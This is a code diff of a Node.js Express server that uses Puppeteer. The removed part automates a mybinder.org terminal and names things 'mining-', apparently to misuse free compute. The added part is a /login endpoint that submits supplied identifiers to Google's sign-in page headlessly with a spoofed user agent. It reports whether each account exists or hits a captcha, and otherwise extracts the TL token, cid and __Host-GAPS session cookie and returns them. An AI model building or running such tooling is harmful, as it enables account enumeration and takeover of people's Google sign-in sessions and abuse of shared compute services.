@@ -1,124 +1,136 @@
-const puppeteer = require("puppeteer")
-const request = require('request')
+const bodyParser = require('body-parser')
+const puppeteer = require('puppeteer')
 const express = require('express')
 
 const app = express()
 
-app.listen(process.env.PORT || 3000, () => {
-    console.log('Listening on port 3000 ...')
+app.use(express.json())
+app.use(bodyParser.urlencoded({ extended: true }))
+
+app.listen(process.env.PORT || 3000, ()=>{
+    console.log("Listening on port: "+(process.env.PORT || 3000))
 })
 
+let signIn = 'https://accounts.google.com/v3/signin/identifier?dsh=S940062189%3A1665260575698599&continue=https%3A%2F%2Faccounts.google.com%2F&followup=https%3A%2F%2Faccounts.google.com%2F&passive=1209600&flowName=GlifWebSignIn&flowEntry=ServiceLogin&ifkv=AQDHYWp7Xws8OWDo__8vSPkkEImpDwna2RbBmEUp7Wfl7GpYaoWHAtWPfHfSSX-zonF0xYJnZ7HWlw&hl=en-US'
+
 let browser = null
-let page = null
-let options = {}
-let start = new Date().getTime()
-let end = 0
 
-console.log('Start: '+start)
+;(async () => {
 
+    browser = await puppeteer.launch({
+        headless: true,
+        args: [ '--no-sandbox', '--disable-setuid-sandbox' ]
+    })
 
-app.get('/api', async function(req, res) {
-    //if(browser == null) {
-        start = new Date().getTime()
-        let mOpenTerminal = false
-        
-        browser = await puppeteer.launch({
-                headless: true,
-                args: ['--no-sandbox', '--disable-setuid-sandbox']
-            })
+    console.log('Success')
+
+})()
+
+async function loginToken(connection, number) {
+    let mCaptcha = false
+    let mTimer = null
     
-        page = (await browser.pages())[0]
-    
-        page.on('request', async req => {
-            const url = req.url()
-            console.log(url)
-            if((url.includes('kernelspecs?') || url.includes('api/terminals?') || url.includes('api/contents?')) && !mOpenTerminal) {
-                let click = await page.evaluate(() => {
-                    let root = document.querySelector('div[title="Start a new terminal session"]')
-                    if(root) {
-                        root.click()
+    let page = await browser.newPage()
+
+    await page.setUserAgent('Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36')
+
+    page.on('request', async (req) => {
+        let url = req.url
+        //console.log(url)
+        if(url.includes('source-path=%2Fv3%2Fsignin%2Frejected')) {
+            try {
+                if(mTimer != null) clearTimeout(mTimer)
+                page.close()
+            } catch (e) {}
+            if(connection) {
+                connection.end('Reject')
+            }
+            console.log('Reject')
+        } else if(url.startsWith('https://accounts.google.com/Captcha')) {
+            if(!mCaptcha) {
+                mCaptcha = true
+                try {
+                    if(mTimer != null) clearTimeout(mTimer)
+                    page.close()
+                } catch (e) {}
+                if(connection) {
+                    connection.end('Captcha')
+                }
+                console.log('Captcha')
+            }
+        } else if(url.startsWith('https://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute?rpcids=V1UmUe')) {
+            mCaptcha = false
+            mTimer = setTimeout(async () => {
+                let error = await page.evaluate(() => {
+                    let error = document.querySelector('div.o6cuMc')
+                    if(error != null && error.innerText.startsWith('Couldn\'t find your Google Account')) {
                         return true
                     }
                     return false
                 })
-    
-                if(click && !mOpenTerminal) {
-                    mOpenTerminal = true
-                    console.log('Success')
-                    await waitForSelector(page, 'canvas[class="xterm-cursor-layer"]')
-                    await delay(420)
-                    await page.keyboard.type('lscpu')
-                    console.log('Type')
-                    await delay(420)
-                    await page.keyboard.press('Enter')
-    
-                    end = new Date().getTime()
-
-                    console.log('End: '+end)
-                    
+                if(error) {
                     try {
-                        await page.close()
+                        if(mTimer != null) clearTimeout(mTimer)
+                        page.close()
                     } catch (e) {}
-                    
-                    try {
-                        await browser.close()
-                    } catch (e) {}
-
-                    res.writeHeader(200, {"Content-Type": "text/html"})
-                    res.write(''+(end-start))
-                    res.end()
+                    if(connection) {
+                        connection.end('Not Found')
+                    }
+                    console.log('Not Found')
                 }
+            }, 1500)
+        } else if(url.startsWith('https://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute?rpcids=jfk2af')) {
+            let pageUrl = await page.evaluate(() => window.location.href)
+            let tl = 'null'
+            let gps = 'null'
+            let cid = '1'
+            let index = pageUrl.indexOf('TL=')
+            if(index != -1) {
+                tl = pageUrl.substring(index+3, pageUrl.length).split('&')[0]
+                index = pageUrl.indexOf('cid=')
+                if(index != -1) {
+                    cid = pageUrl.substring(index+4, pageUrl.length).split('&')[0]
+                }
+                let cookie = await page.cookies()
+                cookie.forEach(function (value) {
+                    if (value.name == '__Host-GAPS') {
+                        gps = value.value
+                    }
+                })
             }
-        })
-    
-        page.on('dialog', async dialog => dialog.type() == "beforeunload" && dialog.accept())
-    
-        await page.goto('https://mybinder.org/v2/git/https%3A%2F%2Fgithub.com%2Faanksatriani%2Fmybinder.git/main')    
-    /*} else {
-        res.writeHeader(200, {"Content-Type": "text/html"})
-        res.write('Update')
-        res.end()
-    }*/
-})
+            try {
+                if(mTimer != null) clearTimeout(mTimer)
+                page.close()
+            } catch (e) {}
+            if(connection) {
+                connection.end(tl+'★'+gps+'★'+cid)
+            }
+            console.log(tl, cid)
+        }
+    })
 
-app.get("/page", async (req, res) => {
-    try {
-        res.send(await page.title())
-    } catch (err) {
-        res.send(err)
-    }
-})
-
-app.get("/check", async (req, res) => {
-    res.writeHeader(200, {"Content-Type": "text/html"})
-    res.write(start+' '+end+' '+(end-start))
-    res.end()
-})
-
-async function waitForSelector(page, command) {
-    for (let i = 0; i < 10; i++) {
-        await delay(1000)
-        const value = await page.evaluate((command) => { return document.querySelector(command) }, command)
-        if (value) i = 10
-    }
+    await page.goto(signIn+'#Email='+number)
+    await page.evaluate(() => document.querySelector('#identifierNext').click())
 }
+
+app.post('/login', async function (req, res) {
+    if(req.body) {
+        if(req.body.number) {
+            if(browser != null) {
+                await loginToken(res, req.body.number)
+            } else {
+                res.end('null')
+            }
+        } else {
+            res.end('error')
+        }
+    } else {
+        res.end('error')
+    }
+})
 
 function delay(time) {
-    return new Promise(function (resolve) {
+    return new Promise(function(resolve) { 
         setTimeout(resolve, time)
     })
-}
-
-function getTime() {
-    var currentdate = new Date();
-    return "Last Sync: @ " + currentdate.getHours() + ":" + currentdate.getMinutes() + ":" + currentdate.getSeconds() + ' @ --- '
-}
-
-function getUpdate(size) {
-    let zero = ''
-    let loop = size.toString().length
-    for (let i = 0; i < 3 - loop; i++) {
-        zero += '0'
-    }
-    return 'mining-' + zero + size
 }
